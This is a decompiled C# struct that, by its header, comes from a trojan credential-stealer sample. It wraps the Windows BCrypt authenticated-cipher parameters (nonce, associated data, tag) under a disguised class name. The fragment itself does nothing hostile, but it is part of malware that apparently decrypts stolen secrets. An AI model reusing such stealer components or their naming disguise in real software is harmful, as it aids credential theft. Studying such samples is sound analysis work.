// Decompiled with JetBrains decompiler
// Type: SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Runtime.InteropServices;

public struct SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev : IDisposable
{
  public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 1;
  public int cbSize;
  public int dwInfoVersion;
  public IntPtr pbNonce;
  public int cbNonce;
  public IntPtr pbAuthData;
  public int cbAuthData;
  public IntPtr pbTag;
  public int cbTag;
  public IntPtr pbMacContext;
  public int cbMacContext;
  public int cbAAD;
  public long cbData;
  public int dwFlags;

  public SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev(
    byte[] iv,
    byte[] aad,
    byte[] tag)
    : this()
  {
    this.dwInfoVersion = SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
    this.cbSize = Marshal.SizeOf(typeof (SystemDiagnosticsCodeAnalysisExcludeFromCodeCoverageAttributev));
    if (iv != null)
    {
      this.cbNonce = iv.Length;
      this.pbNonce = Marshal.AllocHGlobal(this.cbNonce);
      Marshal.Copy(iv, 0, this.pbNonce, this.cbNonce);
    }
    if (aad != null)
    {
      this.cbAuthData = aad.Length;
      this.pbAuthData = Marshal.AllocHGlobal(this.cbAuthData);
      Marshal.Copy(aad, 0, this.pbAuthData, this.cbAuthData);
    }
    if (tag == null)
      return;
    this.cbTag = tag.Length;
    this.pbTag = Marshal.AllocHGlobal(this.cbTag);
    Marshal.Copy(tag, 0, this.pbTag, this.cbTag);
    this.cbMacContext = tag.Length;
    this.pbMacContext = Marshal.AllocHGlobal(this.cbMacContext);
  }

  public void Dispose()
  {
    if (this.pbNonce != IntPtr.Zero)
      Marshal.FreeHGlobal(this.pbNonce);
    if (this.pbTag != IntPtr.Zero)
      Marshal.FreeHGlobal(this.pbTag);
    if (this.pbAuthData != IntPtr.Zero)
      Marshal.FreeHGlobal(this.pbAuthData);
    if (!(this.pbMacContext != IntPtr.Zero))
      return;
    Marshal.FreeHGlobal(this.pbMacContext);
  }
}
